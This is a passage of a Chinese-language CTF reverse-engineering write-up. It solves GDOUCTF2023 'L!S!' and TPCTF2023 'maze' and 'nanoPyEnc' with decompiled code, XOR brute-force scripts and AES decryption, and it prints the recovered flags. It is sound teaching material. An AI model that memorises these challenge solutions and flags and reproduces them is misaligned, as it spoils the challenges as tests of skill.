b&#x27;flag&#123;3ea590ccwxehg715264fzxnzepqz\x7f&#x27;</span></span><br></pre></td></tr></table></figure><p>有点残缺 但最后一位肯定是} 所以无关紧要</p><hr><hr><p>这题的反调试那里确实把我坑到 所以还是要动调看逻辑 不要盲目下论断<br>还有最后一步加密的时候 各种下标的+1&#x2F;+0 关系不要弄错了…</p><h1 id="GDOUCTF2023"><a href="#GDOUCTF2023" class="headerlink" title="GDOUCTF2023"></a>GDOUCTF2023</h1><h2 id="L-S"><a href="#L-S" class="headerlink" title="L!S!"></a>L!S!</h2><p>…<br>根据提示 用IDA的bindiff插件查看两个文件的不同处<br>定位到这里</p><p>origin:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">void</span> **)*((_QWORD *)sorted_file + v4);</span><br><span class="line">      v7 = *((_DWORD *)v6 + <span class="number">42</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">3</span> &amp;&amp; v7 != <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      v8 = *v6;</span><br><span class="line">      <span class="keyword">if</span> ( !src )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      component = (_BYTE *)last_component(*v6);</span><br><span class="line">      <span class="keyword">if</span> ( *component == <span class="number">46</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v16 = component[(component[<span class="number">1</span>] == <span class="number">46</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v16 || v16 == <span class="number">47</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v8 == <span class="number">47</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_19:</span><br><span class="line">        queue_directory(v8, v6[<span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = (<span class="type">void</span> *)file_name_concat(src, v8, <span class="number">0LL</span>);</span><br><span class="line">        queue_directory(v10, v6[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">free</span>(v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_DWORD *)v6 + <span class="number">42</span>) == <span class="number">9</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ...</span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p>patched:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="type">void</span> **)*((_QWORD *)sorted_file + v4);</span><br><span class="line">      v7 = *((_DWORD *)v6 + <span class="number">42</span>);</span><br><span class="line">      v8 = *v6;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="number">3</span> &amp;&amp; v7 != <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">        <span class="keyword">if</span> ( v8 &amp;&amp; !v8[<span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v19[<span class="number">1</span>] = <span class="number">0x3F7D132A2A252822</span>LL;</span><br><span class="line">          v19[<span class="number">0</span>] = <span class="number">0x7D2E370A180F1604</span>LL;</span><br><span class="line">          v20 = <span class="number">0x31207C7C381320</span>LL;</span><br><span class="line">          v19[<span class="number">2</span>] = <span class="number">0x392A7F3F39132D13</span>LL;</span><br><span class="line">          v18 = v19;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(_BYTE *)v18 ^= *(_BYTE *)*v6;</span><br><span class="line">            v18 = (__int64 *)((<span class="type">char</span> *)v18 + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( (__int64 *)((<span class="type">char</span> *)&amp;v20 + <span class="number">7</span>) != v18 );</span><br><span class="line">          <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)v19);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !src )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      component = (_BYTE *)last_component(*v6);</span><br><span class="line">      <span class="keyword">if</span> ( *component == <span class="number">46</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = component[(component[<span class="number">1</span>] == <span class="number">46</span>) + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v17 || v17 == <span class="number">47</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">      ...&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现这里v6是一个定值 完全可以爆破(range(256))<br>然后小端序取出v19[0,1,2],v20[0]爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="string">&quot;04160F180A372E7D&quot;</span>,<span class="string">&quot;2228252A2A137D3F&quot;</span>,<span class="string">&quot;132D13393F7F2A39&quot;</span>,<span class="string">&quot;2013387C7C2031&quot;</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>):</span><br><span class="line">        c.append(<span class="built_in">int</span>(s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cc <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(cc^key)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;CTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># HZCTF&#123;b1ndiff_1s_a_us3ful_t00l&#125;</span></span><br></pre></td></tr></table></figure><p>这题开始我还想着动调找v6的值 发现程序给我ls后就卡着了…</p><h1 id="TPCTF2023"><a href="#TPCTF2023" class="headerlink" title="TPCTF2023"></a>TPCTF2023</h1><p>参考:</p><ul><li><a href="https://mp.weixin.qq.com/s/0nJHKJjDFrWHgspoVF23xA"> + </a></li></ul><h2 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h2><p>要用pyinsxxx提取出pyz 必须满足python版本一致<br>Linux下载一个python3.8 然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.8 pyxxx.py maze</span><br></pre></td></tr></table></figure><p>这样就能成功解包<br>然后终端运行python3.8 也能import maze 来查看内部逻辑<br>运行 help(maze)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">Help on module maze:</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">    maze</span><br><span class="line"></span><br><span class="line">CLASSES</span><br><span class="line">    builtins.object</span><br><span class="line">        Q2Fy</span><br><span class="line">        Q2VsbA</span><br><span class="line">        TWF6ZUxhbmc</span><br><span class="line">    </span><br><span class="line">    class Q2Fy(builtins.object)</span><br><span class="line">     |  Q2Fy(value, x, y)</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, value, x, y)</span><br><span class="line">     |  </span><br><span class="line">     |  __repr__(self)</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">:</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line">    </span><br><span class="line">    class Q2VsbA(builtins.object)</span><br><span class="line">     |  Q2VsbA(name, value)</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, name, value)</span><br><span class="line">     |  </span><br><span class="line">     |  __repr__(self)</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line">    </span><br><span class="line">    class TWF6ZUxhbmc(builtins.object)</span><br><span class="line">     |  TWF6ZUxhbmc(code)</span><br><span class="line">     |  </span><br><span class="line">     |  Methods defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  YWRkX2NlbGw(self, code)</span><br><span class="line">     |  </span><br><span class="line">     |  </span><br><span class="line">     |  YWRkX2Z1bmN0aW9u(self, code)</span><br><span class="line">     |  </span><br><span class="line">     |  Z2V0X2NlbGw(self, code)</span><br><span class="line">     |  </span><br><span class="line">     |  Z2V0X3Bvcw(self, pos, direction)</span><br><span class="line">     |  </span><br><span class="line">     |  __init__(self, code)</span><br><span class="line">     |  </span><br><span class="line">     |  aW5pdA(self)</span><br><span class="line">     |  </span><br><span class="line">     |  b3Bw(self, direction)</span><br><span class="line">     |  </span><br><span class="line">     |  c3RlcA(self)</span><br><span class="line">     |  </span><br><span class="line">     |  cnVuX3RpbGxfb3V0cHV0(self)</span><br><span class="line">     |  </span><br><span class="line">     |  ----------------------------------------------------------------------</span><br><span class="line">     |  Data descriptors defined here:</span><br><span class="line">     |  </span><br><span class="line">     |  __dict__</span><br><span class="line">     |      dictionary for instance variables (if defined)</span><br><span class="line">     |  </span><br><span class="line">     |  __weakref__</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line">:</span><br><span class="line">     |      list of weak references to the object (if defined)</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    aW5pdF9zZWNyZXQ()</span><br><span class="line">    </span><br><span class="line">    c29sdmU(SvL6VEBRwx) -&gt; &#x27;int&#x27;</span><br><span class="line">    </span><br><span class="line">    exit(status=None, /)</span><br><span class="line">        Exit the interpreter by raising SystemExit(status).</span><br><span class="line">        </span><br><span class="line">        If the status is omitted or None, it defaults to zero (i.e., success).</span><br><span class="line">        If the status is an integer, it will be used as the system exit status.</span><br><span class="line">        If it is another kind of object, it will be printed and the system</span><br><span class="line">        exit status will be one (i.e., failure).</span><br><span class="line">    </span><br><span class="line">    run()</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    EqdU3uQNCi = [18, 17, 15, 0, 27, 31, 10, 19, 14, 21, 25, 22, 6, 3, 30,...</span><br><span class="line">    UJ9mxXxeoS = &#x27;IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgXl4gIyMg...gLT4g...</span><br><span class="line">    __test__ = &#123;&#125;</span><br><span class="line">    c2VjcmV0 = [7, 47, 60, 28, 39, 11, 23, 5, 49, 49, 26, 11, 63, 4, 9, 2,...</span><br><span class="line">    regexes = &#123;&#x27;direction&#x27;: &#x27;%[LRUDNlrudn]&#x27;, &#x27;function&#x27;: &#x27;[A-Za-z][A-Za-z0...</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /mnt/hgfs/c/Users/asus/Desktop/tmp/c447cfe2-3b00-4b1a-b109-c511fdb23766/maze_extracted/maze.so</span><br><span class="line"></span><br><span class="line">(END)</span><br></pre></td></tr></table></figure><p>导出关键数据:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EqdU3uQNCi =  [<span class="number">18</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">14</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">22</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">9</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">28</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">32</span>, <span class="number">12</span>, <span class="number">23</span>, <span class="number">11</span>]</span><br><span class="line"></span><br><span class="line">UJ9mxXxeoS =  IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgXl4gIyMgXl4gIyMKIyMgIyMgIyMgLi4gIyMgSVogIyMgIyMgIyMgIyMKIyMgJVIgLi4gJUQgIyMgJUQgLi4gLi4gJUwgIyMKIyMgPj4gIyMgLi4gIyMgRUEgKiogUFAgJVUgIyMKIyMgJVUgSUEgVEEgIyMgRUIgKiogUFAgJVUgIyMKIyMgJVUgSUIgVEIgIyMgRUMgKiogUFAgJVUgIyMKIyMgJVUgSUMgVEMgIyMgRUQgKiogUFAgJVUgIyMKIyMgJVUgSUQgVEQgIyMgRUUgKiogUFAgJVUgIyMKIyMgJVUgSUUgVEUgIyMgRUYgKiogUFAgJVUgIyMKIyMgJVUgSUYgVEYgIyMgJVIgKiogSVogJVUgIyMKIyMgJVUgSUcgJUwgIyMgIyMgIyMgIyMgIyMgIyMKIyMgIyMgIyMgIyMgIyMgIyMKClBQIC0+ICs9MQpNTSAtPiAtPTEKSVogLT4gPTAKRUEgLT4gSUYgPT0wIFRIRU4gJVIgRUxTRSAlRApFQiAtPiBJRiA9PTEgVEhFTiAlUiBFTFNFICVECkVDIC0+IElGID09MiBUSEVOICVSIEVMU0UgJUQKRUQgLT4gSUYgPT0zIFRIRU4gJVIgRUxTRSAlRApFRSAtPiBJRiA9PTQgVEhFTiAlUiBFTFNFICVECkVGIC0+IElGID09NSBUSEVOICVSIEVMU0UgJUQKVEEgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklBIC0+ID03MgpUQiAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUIgLT4gPTczClRDIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJQyAtPiA9ODQKVEQgLT4gSUYgKiogVEhFTiAlTCBFTFNFICVECklEIC0+ID04MApURSAtPiBJRiAqKiBUSEVOICVMIEVMU0UgJUQKSUUgLT4gPTY3ClRGIC0+IElGICoqIFRIRU4gJUwgRUxTRSAlRApJRiAtPiA9ODQKSUcgLT4gPTcwCkxUIC0+IElGID09NiBUSEVOICVEIEVMU0UgJUwK</span><br><span class="line"></span><br><span class="line">c2VjcmV0 =  [<span class="number">7</span>, <span class="number">47</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">39</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">5</span>, <span class="number">49</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">63</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">25</span>, <span class="number">61</span>, <span class="number">36</span>, <span class="number">112</span>, <span class="number">25</span>, <span class="number">15</span>, <span class="number">62</span>, <span class="number">25</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="number">102</span>, <span class="number">38</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">37</span>, <span class="number">4</span>, <span class="number">40</span>]</span><br><span class="line"></span><br><span class="line">regexes =  &#123;<span class="string">&#x27;wall&#x27;</span>: <span class="string">&#x27;##|``&#x27;</span>, <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;\\.\\.&#x27;</span>, <span class="string">&#x27;splitter&#x27;</span>: <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;pause&#x27;</span>: <span class="string">&#x27;[0-9]&#123;2&#125;&#x27;</span>, <span class="string">&#x27;start&#x27;</span>: <span class="string">&#x27;\\^\\^&#x27;</span>, <span class="string">&#x27;hole&#x27;</span>: <span class="string">&#x27;\\(\\)&#x27;</span>, <span class="string">&#x27;out&#x27;</span>: <span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;in&#x27;</span>: <span class="string">&#x27;&lt;&lt;&#x27;</span>, <span class="string">&#x27;one-use&#x27;</span>: <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;direction&#x27;</span>: <span class="string">&#x27;%[LRUDNlrudn]&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>: <span class="string">&#x27;(?&lt;=\\*)[\\*A-Za-z0-9]&#x27;</span>, <span class="string">&#x27;function&#x27;</span>: <span class="string">&#x27;[A-Za-z][A-Za-z0-9]&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后就需要硬逆maze.so<br>前面对maze得信息收集知道只有两个函数 且名字都是直接base64编码得 init_secret和solve<br>慢慢逆 solve<br>可以发现开始是一个b64decode 然后check len&#x3D;&#x3D;33<br>接下来调用了init_secret 然后进行了一个xor<br>xor后可以发现用到了 _c2VjcmV0作为check<br>用mazelang解释器运行一下base64解码出的.mz<br>发现没有输出 ctrl+c终止发现一直重复输出 72738480678470<br>很容易发现就是HITPCTF<br>所以我们调用init_secret后 将c2VjcmV0[i]与key[i]异或即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.8</span><span class="number">.18</span> (default, Aug <span class="number">25</span> <span class="number">2023</span>, <span class="number">13</span>:<span class="number">20</span>:<span class="number">30</span>) </span><br><span class="line">[GCC <span class="number">11.4</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> maze <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = <span class="string">&quot;HITPCTF&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aW5pdF9zZWNyZXQ()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line"><span class="meta">... </span>    x = c2VjcmV0[i]^<span class="built_in">ord</span>(key[i%<span class="number">7</span>])</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="built_in">chr</span>((x&amp;<span class="number">0xff</span>)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">TPCTF&#123;yOu_@re_m@sT3r_OF_mAZElaN6&#125;&gt;&gt;&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>TPCTF{yOu_@re_m@sT3r_OF_mAZElaN6}</strong></p><h2 id="nanoPyEnc"><a href="#nanoPyEnc" class="headerlink" title="nanoPyEnc"></a>nanoPyEnc</h2><p>很有意思的题<br>一样的 python3.8运行pyinsxxxxx解包<br>主的run.py从secret获取key,enc 对输入进行一个AES_ECB加密 与enc比较<br>在PYZ找到secret 拿出enc&#x2F;key 解AES发现是 flag{test} 假flag<br>注意到导入了三个包 而且PYZ里有这三个 说明不是python原本的</p><p>挨个看<br>首先在Crypto.Util.number的sieve_base数组最后发现有一段覆盖enc的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> time.time() % <span class="number">64</span> &lt; <span class="number">1</span>:</span><br><span class="line">    enc = (<span class="number">153</span>, <span class="number">240</span>, <span class="number">237</span>, <span class="number">199</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">237</span>, <span class="number">45</span>, <span class="number">25</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">176</span>, <span class="number">219</span>, <span class="number">247</span>, <span class="number">44</span>, <span class="number">115</span>, <span class="number">169</span>, <span class="number">124</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">121</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">137</span>, <span class="number">34</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">182</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">41</span>, <span class="number">165</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">231</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">30</span>, <span class="number">124</span>, <span class="number">237</span>)</span><br></pre></td></tr></table></figure><p>在Crypto.Util.Padding中发现又引入了py3compat<br>查看py3compat 发现覆写了list方法 让传入的s每位xor了1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>(<span class="params">s</span>):</span><br><span class="line">    _x = time.time() % <span class="number">64</span> &lt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ _x ^ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="number">.0</span> ])(s)</span><br></pre></td></tr></table></figure><p>注意到list是python自带的列表方法 在主的run.py被调用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encrypted = <span class="built_in">list</span>(encrypt_message(key, message.encode()))</span><br></pre></td></tr></table></figure><p>所以再加密后又进行了xor 1的操作 逆向回去就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;2033-05-18_03:33&#x27;</span></span><br><span class="line">key = key.encode()</span><br><span class="line">enc = [<span class="number">153</span>, <span class="number">240</span>, <span class="number">237</span>, <span class="number">199</span>, <span class="number">63</span>, <span class="number">44</span>, <span class="number">237</span>, <span class="number">45</span>, <span class="number">25</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">176</span>, <span class="number">219</span>, <span class="number">247</span>, <span class="number">44</span>, <span class="number">115</span>, <span class="number">169</span>, <span class="number">124</span>, <span class="number">64</span>, <span class="number">63</span>, <span class="number">121</span>, <span class="number">253</span>, <span class="number">250</span>, <span class="number">137</span>, <span class="number">34</span>, <span class="number">144</span>, <span class="number">33</span>, <span class="number">17</span>, <span class="number">182</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">247</span>, <span class="number">249</span>, <span class="number">41</span>, <span class="number">165</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">231</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">30</span>, <span class="number">124</span>, <span class="number">237</span>]</span><br><span class="line">enc = [x^<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> enc]</span><br><span class="line">enc = <span class="built_in">bytes</span>(enc)</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">pt = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(pt.decode())</span><br></pre></td></tr></table></figure><p><strong>TPCTF{83_C4u710U5_0F_PY7hON_k3YW0Rd_sHadOWIN9}</strong></p><h1 id="GXYCTF2019"><a href="#GXYCTF2019" class="headerlink" title="GXYCTF2019"></a>GXYCTF2019</h1><h2 id="minecraft"><a href="#minecraft" class="headerlink" title="minecraft"></a>minecraft</h2><p>IDA打开exe的main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)String_to_long(v9) != <span class="number">1</span> )</span><br><span class="line">  